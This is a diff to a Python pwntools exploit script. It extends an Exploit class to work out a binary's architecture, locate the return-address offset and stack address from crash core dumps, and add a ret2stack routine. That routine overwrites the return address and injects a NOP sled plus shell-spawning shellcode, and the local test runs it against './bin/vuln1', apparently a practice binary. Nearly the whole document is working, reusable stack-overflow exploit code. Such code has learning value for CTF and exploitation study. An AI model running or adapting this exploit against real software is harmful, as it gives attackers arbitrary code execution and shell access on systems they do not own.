@@ -12,32 +12,95 @@ class Exploit:
         self.elf = file_path
         self.send_func = send_func
 
+        if self.is_64bit_elf():
+            self.arch = 'amd64'
+        elif self.is_32bit_elf():
+            self.arch = 'x86'
+        else:
+            raise Exception('Unknown architecture')
+
     def __str__(self):
         return "Type:"+str(self.elf)
+
+    def is_64bit_elf(self):
+        with open(self.elf,'rb') as f:
+            return(f.read(5)[-1]) == 2
+
+    def is_32bit_elf(self):
+        with open(self.elf,'rb') as f:
+            return (f.read(5)[-1]) == 1
+
     
     def find_offset(self):
         
         p = process(self.elf)
 
-        self.send_func(p,cyclic(30,n=8))
+        if self.arch == 'amd64':
+            self.send_func(p,cyclic(30,n=8))
+        else:
+            self.send_func(p,cyclic(30,n=4))
         p.wait()
 
         core = p.corefile
 
-        return cyclic_find(core.read(core.esp, 8), n=8)
+        if core.arch == 'i386':
+            #print(f"{core.eip:x}")
+            return cyclic_find(core.eip, n=4)
+        elif core.arch == 'amd64':
+            #print(f"{core.rsp:x}")
+            return cyclic_find(core.read(core.rsp, 8), n=8)
+        else:
+            raise Exception(f'Unknown arch: {core.arch}')
     
     def find_stack_addr(self, offset):
         
         p = process(self.elf)
 
-        payload = b'A' * (offset + 4)
+        if self.arch == 'amd64':
+            payload = b'A' * (offset) + b'BBBBBBBB'
+        else:
+            payload = b'A' * (offset) + b'BBBB'
 
         self.send_func(p,payload)
         p.wait()
 
         core = p.corefile
 
-        return core.esp
+        if core.arch == 'i386':
+            #print(f"{core.eip:x}")
+            return core.esp
+        elif core.arch == 'amd64':
+            #print(f"{core.rsp:x}")
+            return core.rsp
+        else:
+            raise Exception(f'Unknown arch: {core.arch}')
+    
+    def ret2stack(self, offset=None, stack_addr=None):
+        if offset == None:
+            offset = self.find_offset()
+        
+        if stack_addr == None:
+            stack_addr = self.find_stack_addr(offset)
+
+
+        p = process(self.elf)
+        if self.arch == 'amd64':
+            context.update(arch='amd64',os='linux')
+
+            payload = b'A' * offset
+            payload += p64(stack_addr + 8)
+            payload += asm(shellcraft.nop() * 0x10)
+            payload += asm(shellcraft.sh())
+        else:
+            context.update(arch='x86',os='linux')
+
+            payload = b'A' * offset
+            payload += p32(stack_addr + 4)
+            payload += asm(shellcraft.nop() * 0x10)
+            payload += asm(shellcraft.sh())
+
+        self.send_func(p,payload) 
+        p.interactive()
     
     def __enter__(self):
         return self
@@ -75,17 +138,13 @@ def test_ssh():
         
         print(exp.find_offset())
 
+
 def fill_buf(p,data):
     p.sendline(data)
 
 def test_local():
     with Exploit('./bin/vuln1',fill_buf) as exp:
-        print(exp)
-        offset = (exp.find_offset())
-
-        print(offset)
-
-        print(f"{exp.find_stack_addr(offset)}:x")
+        exp.ret2stack()
 
 
 
